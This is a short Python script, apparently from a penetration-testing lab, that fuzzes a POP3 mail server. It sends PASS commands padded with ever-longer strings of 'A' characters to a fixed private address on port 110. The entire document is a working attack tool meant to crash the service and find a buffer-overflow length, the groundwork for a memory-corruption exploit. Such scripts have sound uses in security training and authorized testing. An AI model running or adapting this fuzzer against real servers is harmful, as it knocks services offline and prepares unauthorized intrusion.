#!/usr/bin/env python
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 

buffer = ['A']
counter = 100
while len(buffer) <= 30:
    buffer.append('A'*counter)
    counter = counter+200


for string in buffer:
    print('Fuzzing pop server with %s bytes.' % len(string))
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connect = s.connect(('10.11.13.57',110))
    data = s.recv(1024)

    s.send('USER test' + '\r\n')
    data = s.recv(1024)

    s.send('PASS' + string + '\r\n')
    data = s.recv(1024)
    
    s.send('QUIT\r\n')
    s.close()

